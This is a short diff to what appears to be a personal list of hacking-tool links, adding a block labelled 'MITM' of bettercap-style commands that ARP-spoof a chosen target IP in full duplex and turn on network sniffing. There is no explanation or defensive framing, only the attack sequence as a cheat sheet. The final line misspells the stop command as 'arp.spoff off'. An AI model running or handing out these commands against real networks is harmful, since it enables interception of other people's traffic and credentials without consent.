@@ -25,3 +25,12 @@ https://esp.huhn.me/
 https://cedarctic.github.io/digiQuack/
 https://github.com/aandrew-me/tgpt
 https://github.com/sbcshop/HackyPi-Software
+// MITM
+set arp.spoof.fullduplex true
+net.show
+set arp.spoof.targets ip
+arp.spoof on
+help
+net.sniff on
+net.sniff off
+arp.spoff off
